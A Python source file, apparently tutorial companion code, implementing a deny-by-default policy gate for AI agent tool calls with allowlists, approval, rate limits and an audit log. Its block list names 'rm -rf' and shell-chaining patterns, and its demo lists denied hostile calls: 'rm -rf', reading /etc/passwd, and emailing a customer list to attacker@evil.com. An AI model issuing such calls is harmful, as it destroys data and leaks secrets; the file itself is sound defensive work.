"""policy_gate.py - a deny-by-default policy gate for AI agent tool calls.

Companion code for the tutorial "Put a Policy Gate in Front of Your AI
Agent's Tools" (https://anushamukka.com/posts/put-a-policy-gate-in-front-of-your-ai-agent/).

The whole design: a policy written as plain data, an evaluate(tool, args)
function that returns a decision (allow, deny, or needs_approval) with a
reason, a single dispatch() choke point that every tool call goes through,
and an audit log recording every decision as a JSON line.

Standard library only, except that loading YAML policy files needs PyYAML
(JSON policy files need nothing). The gate should be the easiest part of
your agent to read, not another dependency to audit.
"""

import functools
import json
import os
import re
import time
from dataclasses import dataclass
from datetime import datetime, timezone

# ---------------------------------------------------------------------------
# Step 1: decisions.
#
# A Decision is the gate's whole vocabulary: allow, deny, or needs_approval.
# The third state exists because some tools are too dangerous for a yes/no
# rule and too useful to ban outright. Anything that is not explicitly
# allowed is denied, and a call that needs approval is denied unless a
# human (or a callback acting for one) says yes.
# ---------------------------------------------------------------------------

ALLOW = "allow"
DENY = "deny"
NEEDS_APPROVAL = "needs_approval"


@dataclass(frozen=True)
class Decision:
    decision: str  # one of ALLOW, DENY, NEEDS_APPROVAL
    reason: str
    tool: str
    args: dict


# ---------------------------------------------------------------------------
# Step 2: the policy, as data.
#
# Read it in one screen; change it without touching logic. Anything not
# listed here does not exist as far as the gate is concerned: there is no
# "delete_user" entry, so a call to one is denied. That is deny by default,
# the single most important property of this file.
#
# Rule keys and what they mean:
#   allowed_prefixes   path prefixes the tool may touch
#   blocked_paths      paths denied even inside an allowed prefix
#                      (the denylist wins over the allowlist)
#   allowed_commands   first words of shell commands that may run
#   blocked_patterns   regexes matched against the whole command (deny)
#   max_command_length longest shell command accepted
#   allowed_recipients regexes matched against the "to" address (allow)
#   blocked_recipients regexes matched against the "to" address (deny)
#   required_args      argument names that must be present and non-empty
#   needs_approval     True: every call to this tool needs approval
#   approval_patterns  regexes matched against string args; a hit needs
#                      approval
#   rate_limit         {"max_calls": N, "window_seconds": S}: at most N
#                      allowed calls per rolling window S
#   allowed            True: for tools with no bespoke rule logic, permit
#                      the call (still subject to required_args, approval,
#                      and rate limits). Anything else is denied.
# ---------------------------------------------------------------------------
POLICY = {
    "read_file": {
        "allowed_prefixes": ["/tmp/work/"],
        "blocked_paths": ["/tmp/work/secrets/"],
    },
    "run_shell": {
        "allowed_commands": ["ls", "cat", "wc", "head", "tail", "grep"],
        "blocked_patterns": [
            r"\brm\s+-rf\b",
            r";",
            r"&&",
            r"\|\|",
            r"`",
            r"\$\(",
        ],
        "allowed_prefixes": ["/tmp/work/"],
        "max_command_length": 500,
        "required_args": ["command"],
    },
    "send_email": {
        "allowed_recipients": [r".*@internal\.example\.com$"],
        "blocked_recipients": [r"^root@internal\.example\.com$"],
        "required_args": ["to"],
    },
}

# ---------------------------------------------------------------------------
# Step 3: the toy agent's tools (stubs), the registry, and registration.
#
# In a real agent these would do real work (subprocess, SMTP, filesystem).
# The gate does not care: it sits between the decision and the execution.
#
# register_tool() is how new tools join. A tool with no policy entry is
# unknown to the gate and every call to it is denied, so registration
# alone never opens a hole; the policy entry is what grants access.
# ---------------------------------------------------------------------------

def tool_read_file(args):
    return "contents of %s (stubbed)" % args["path"]


def tool_run_shell(args):
    return "stub: would run: %s" % args["command"]


def tool_send_email(args):
    return "stub: email to %s with subject '%s'" % (
        args["to"],
        args.get("subject", ""),
    )


TOOLS = {
    "read_file": tool_read_file,
    "run_shell": tool_run_shell,
    "send_email": tool_send_email,
}


def register_tool(name, fn, policy_entry=None):
    """Register a tool implementation, optionally with its policy entry.

    The entry is validated before it is stored. With no entry the tool
    stays unknown to the gate and every call is denied: deny by default.
    Returns fn so it can also be used as a plain function decorator.
    """
    if policy_entry is not None:
        POLICY[name] = validate_tool_policy(name, policy_entry)
    TOOLS[name] = fn
    return fn


# ---------------------------------------------------------------------------
# Step 4: the gate.
#
# evaluate() returns a Decision and never throws: a missing argument, a
# bad argument type, or an unknown tool produces a deny with a reason, not
# an exception, because the dispatch path must always get an answer.
#
# check_call() is the legacy boolean form kept for compatibility: it
# returns (allowed, reason), and a call that needs approval reports
# allowed=False. Failing closed on the legacy path is the only safe
# choice: old callers do not know about the third state.
# ---------------------------------------------------------------------------

def _path_ok(path, prefixes):
    if not isinstance(path, str):
        return False
    # The directory itself must match too, not just paths inside it.
    # The rstrip keeps /tmp/workevil from sneaking past a /tmp/work/ prefix.
    return any(
        path == p.rstrip("/") or path.startswith(p) for p in prefixes
    )


def _check_rules(tool, args, rules):
    """Bespoke rule logic per tool. Returns (allowed, reason)."""
    if tool == "read_file":
        path = args.get("path", "")
        if _path_ok(path, rules.get("blocked_paths", ())):
            return False, "path '%s' is blocked" % path
        if _path_ok(path, rules.get("allowed_prefixes", ())):
            return True, "path is inside an allowed prefix"
        return False, "path '%s' is outside allowed prefixes" % path

    if tool == "run_shell":
        cmd = args.get("command", "")
        max_len = rules.get("max_command_length")
        if max_len is not None and len(cmd) > max_len:
            return False, "command exceeds max length of %d characters" % max_len
        for pattern in rules.get("blocked_patterns", ()):
            if re.search(pattern, cmd):
                return False, "blocked pattern matched: %s" % pattern
        first = cmd.split()[0] if cmd.split() else ""
        if first not in rules.get("allowed_commands", ()):
            return False, "command '%s' is not allowlisted" % first
        for token in cmd.split():
            if token.startswith("/"):
                if _path_ok(token, rules.get("blocked_paths", ())):
                    return False, "path '%s' is blocked" % token
                if not _path_ok(token, rules.get("allowed_prefixes", ())):
                    return False, "path '%s' is outside allowed prefixes" % token
        return True, "command allowlisted, args inside /tmp/work/"

    if tool == "send_email":
        to = args.get("to", "")
        for pattern in rules.get("blocked_recipients", ()):
            if re.match(pattern, to):
                return False, "recipient '%s' is blocked" % to
        for pattern in rules.get("allowed_recipients", ()):
            if re.match(pattern, to):
                return True, "recipient domain is allowlisted"
        return False, "recipient '%s' is not allowlisted" % to

    # Generic tools: deny patterns first, then an explicit allow.
    for pattern in rules.get("blocked_patterns", ()):
        for value in args.values():
            if isinstance(value, str) and re.search(pattern, value):
                return False, "blocked pattern matched: %s" % pattern
    if rules.get("allowed") is True:
        return True, "tool explicitly allowed by policy"
    return False, "no rule matched"


def evaluate(tool, args):
    """Decide a tool call. Returns a Decision. Never throws."""
    if not isinstance(args, dict):
        args = {}
    else:
        args = dict(args)
    rules = POLICY.get(tool)
    if rules is None:
        return Decision(DENY, "unknown tool '%s'" % tool, tool, args)
    if tool not in TOOLS:
        return Decision(
            DENY,
            "tool '%s' has a policy but no registered implementation" % tool,
            tool,
            args,
        )
    for name in rules.get("required_args", ()):
        if not args.get(name):
            return Decision(DENY, "missing required argument '%s'" % name, tool, args)

    allowed, reason = _check_rules(tool, args, rules)
    if not allowed:
        return Decision(DENY, reason, tool, args)

    # Denied calls never reach approval: there is nothing to approve.
    # Approval overrides allow; the rate limit is checked last so only
    # calls that would actually run consume budget.
    if rules.get("needs_approval") is True:
        return Decision(
            NEEDS_APPROVAL, "tool '%s' requires human approval" % tool, tool, args
        )
    for pattern in rules.get("approval_patterns", ()):
        if any(
            isinstance(v, str) and re.search(pattern, v) for v in args.values()
        ):
            return Decision(
                NEEDS_APPROVAL, "approval pattern matched: %s" % pattern, tool, args
            )
    ok, rl_reason = _check_rate_limit(tool, rules)
    if not ok:
        return Decision(DENY, rl_reason, tool, args)
    return Decision(ALLOW, reason, tool, args)


def check_call(tool, args):
    """Legacy boolean form of evaluate(). A call that needs approval
    reports allowed=False: failing closed on a path that does not know
    about the third state."""
    decision = evaluate(tool, args)
    return decision.decision == ALLOW, decision.reason


# ---------------------------------------------------------------------------
# Step 5: rate limiting.
#
# A fixed-window counter per tool, kept in memory. Only calls that would
# actually run consume budget; denied calls do not. This is per-process
# state: if you run several agent replicas, give them a shared store
# (Redis, a database row) instead of this dict.
# ---------------------------------------------------------------------------

_RATE_LIMIT_HITS = {}  # tool name -> list of monotonic timestamps


def reset_rate_limits():
    """Forget all recorded rate-limit hits. Useful in tests and demos."""
    _RATE_LIMIT_HITS.clear()


def _check_rate_limit(tool, rules):
    spec = rules.get("rate_limit")
    if not spec:
        return True, ""
    now = time.monotonic()
    window = spec["window_seconds"]
    hits = [t for t in _RATE_LIMIT_HITS.get(tool, []) if now - t < window]
    if len(hits) >= spec["max_calls"]:
        return (
            False,
            "rate limit exceeded: %d calls in the last %d seconds"
            % (spec["max_calls"], window),
        )
    hits.append(now)
    _RATE_LIMIT_HITS[tool] = hits
    return True, ""


# ---------------------------------------------------------------------------
# Step 6: the dispatch path and the tool decorator.
#
# There is exactly one way to reach a tool, and it goes through the gate.
# No tool executes without a policy decision.
#
# If a decision needs approval, the approver callback resolves it. The
# callback takes the Decision and returns True (run it) or False. With no
# approver the call is denied: failing open here would make approval
# meaningless. The resolution is what lands in the audit log, with the
# original approval reason kept in the text.
# ---------------------------------------------------------------------------

def dispatch(tool, args, approver=None):
    """Run a tool call through the gate. Returns the tool's result on
    allow, or a 'DENIED: <reason>' string otherwise."""
    decision = evaluate(tool, args)
    if decision.decision == NEEDS_APPROVAL:
        if approver is None:
            final = Decision(
                DENY,
                "approval required but no approver configured: " + decision.reason,
                tool,
                decision.args,
            )
        elif approver(decision):
            final = Decision(
                ALLOW, "approved by operator: " + decision.reason, tool, decision.args
            )
        else:
            final = Decision(
                DENY, "approval denied by operator: " + decision.reason, tool, decision.args
            )
    else:
        final = decision
    log_decision(final.tool, final.args, final.decision == ALLOW, final.reason)
    if final.decision != ALLOW:
        return "DENIED: %s" % final.reason
    return TOOLS[tool](final.args)


def gated(tool_name=None, approver=None):
    """Decorate a tool function so its calls go through the gate.

    Decorating registers the function as the tool's implementation and
    returns a wrapper that takes a single args dict and returns whatever
    dispatch() returns. Without a policy entry the tool is denied by
    default, so set one (register_tool with a policy entry, or load a
    policy) before calling.

    Usage:

        def summarize_file(args):
            return "summary of %s" % args["path"]

        gated_summarize = gated("summarize_file")(summarize_file)
        gated_summarize({"path": "/tmp/work/notes.txt"})  # DENIED: unknown tool
    """
    def decorate(fn):
        name = tool_name or fn.__name__
        register_tool(name, fn)

        @functools.wraps(fn)
        def wrapper(args):
            return dispatch(name, args, approver=approver)

        return wrapper

    return decorate


# ---------------------------------------------------------------------------
# Step 7: the audit log. Every decision, allow or deny, lands here as one
# JSON line. The log records the decision and the reason, not just the
# outcome: "denied" tells you nothing six weeks later; "denied, recipient
# not allowlisted" tells you the policy worked. Timestamps are UTC, ISO
# formatted. Local timezones in audit logs are how you lose an afternoon
# to an off-by-five-hours mystery.
# ---------------------------------------------------------------------------

AUDIT_LOG = []


def log_decision(tool, args, allowed, reason):
    AUDIT_LOG.append(
        {
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "tool": tool,
            "args": args,
            "decision": "allow" if allowed else "deny",
            "reason": reason,
        }
    )


def flush_audit(path="audit.log"):
    with open(path, "w") as f:
        for entry in AUDIT_LOG:
            f.write(json.dumps(entry) + "\n")


# ---------------------------------------------------------------------------
# Step 8: policy loading and validation.
#
# Policies live in files as JSON or YAML so they can be reviewed, diffed,
# and owned separately from the code. load_policy() reads either format
# and validates it before returning; a bad policy raises instead of
# silently gating the wrong things. set_policy() swaps the live policy
# after the same validation.
# ---------------------------------------------------------------------------

_RULE_KEYS = {
    "allowed_prefixes",
    "blocked_paths",
    "allowed_commands",
    "blocked_patterns",
    "max_command_length",
    "allowed_recipients",
    "blocked_recipients",
    "required_args",
    "needs_approval",
    "approval_patterns",
    "rate_limit",
    "allowed",
}

_STR_LIST_KEYS = {
    "allowed_prefixes",
    "blocked_paths",
    "allowed_commands",
    "blocked_patterns",
    "allowed_recipients",
    "blocked_recipients",
    "required_args",
    "approval_patterns",
}

_REGEX_KEYS = {
    "blocked_patterns",
    "allowed_recipients",
    "blocked_recipients",
    "approval_patterns",
}


def validate_tool_policy(name, entry):
    """Check one tool's policy entry. Returns the entry; raises
    ValueError on anything malformed, including bad regexes."""
    if not isinstance(entry, dict):
        raise ValueError("policy for tool '%s' must be a dict" % name)
    for key, value in entry.items():
        if key not in _RULE_KEYS:
            raise ValueError(
                "unknown rule '%s' in policy for tool '%s'" % (key, name)
            )
        if key in _STR_LIST_KEYS:
            if not isinstance(value, list) or not all(
                isinstance(v, str) for v in value
            ):
                raise ValueError(
                    "rule '%s' for tool '%s' must be a list of strings"
                    % (key, name)
                )
            if key in _REGEX_KEYS:
                for pattern in value:
                    try:
                        re.compile(pattern)
                    except re.error as e:
                        raise ValueError(
                            "bad regex '%s' in rule '%s' for tool '%s': %s"
                            % (pattern, key, name, e)
                        )
        elif key == "max_command_length":
            if not isinstance(value, int) or value <= 0:
                raise ValueError(
                    "rule 'max_command_length' for tool '%s' must be a "
                    "positive integer" % name
                )
        elif key in ("needs_approval", "allowed"):
            if not isinstance(value, bool):
                raise ValueError(
                    "rule '%s' for tool '%s' must be true or false" % (key, name)
                )
        elif key == "rate_limit":
            if not isinstance(value, dict):
                raise ValueError(
                    "rule 'rate_limit' for tool '%s' must be a dict" % name
                )
            for sub in ("max_calls", "window_seconds"):
                if not isinstance(value.get(sub), int) or value[sub] <= 0:
                    raise ValueError(
                        "rule 'rate_limit.%s' for tool '%s' must be a "
                        "positive integer" % (sub, name)
                    )
    return entry


def validate_policy(policy):
    """Check a whole policy dict. Returns it; raises ValueError if bad."""
    if not isinstance(policy, dict):
        raise ValueError("policy must be a dict of tool name to rule dict")
    for name, entry in policy.items():
        if not isinstance(name, str):
            raise ValueError("tool names in a policy must be strings")
        validate_tool_policy(name, entry)
    return policy


def load_policy(path):
    """Load a policy from a .json or .yaml/.yml file and validate it.

    YAML needs PyYAML installed (pip install pyyaml); JSON needs nothing.
    Raises ValueError for unknown file types or invalid policies.
    """
    ext = os.path.splitext(path)[1].lower()
    with open(path) as f:
        text = f.read()
    if ext == ".json":
        policy = json.loads(text)
    elif ext in (".yaml", ".yml"):
        try:
            import yaml
        except ImportError:
            raise ImportError(
                "PyYAML is required to load YAML policy files "
                "(pip install pyyaml)"
            ) from None
        policy = yaml.safe_load(text)
    else:
        raise ValueError(
            "unsupported policy file type '%s'; use .json, .yaml, or .yml" % ext
        )
    return validate_policy(policy)


def set_policy(policy):
    """Replace the live policy after validating it. Raises ValueError
    on an invalid policy and leaves the old one in place."""
    validate_policy(policy)
    POLICY.clear()
    POLICY.update(policy)


# ---------------------------------------------------------------------------
# Step 9: the demo. Three benign calls, then four calls that should never
# run. Run with: python3 policy_gate.py
# ---------------------------------------------------------------------------

def _summarize(args):
    return " ".join("%s=%s" % (k, v) for k, v in args.items())


def demo():
    calls = [
        ("read_file", {"path": "/tmp/work/notes.txt"}),
        ("run_shell", {"command": "ls /tmp/work"}),
        (
            "send_email",
            {
                "to": "teammate@internal.example.com",
                "subject": "deploy notes",
                "body": "all green",
            },
        ),
        ("run_shell", {"command": "rm -rf /tmp/work"}),
        ("read_file", {"path": "/etc/passwd"}),
        (
            "send_email",
            {
                "to": "attacker@evil.com",
                "subject": "exfil",
                "body": "customer list",
            },
        ),
        ("delete_user", {"id": "root"}),
    ]
    for tool, args in calls:
        allowed, reason = check_call(tool, args)
        print(
            "[%s] %s(%s): %s"
            % ("ALLOW" if allowed else "DENY", tool, _summarize(args), reason)
        )
        print("  ->", dispatch(tool, args))
    flush_audit()
    print("wrote %d decisions to audit.log" % len(AUDIT_LOG))


if __name__ == "__main__":
    demo()
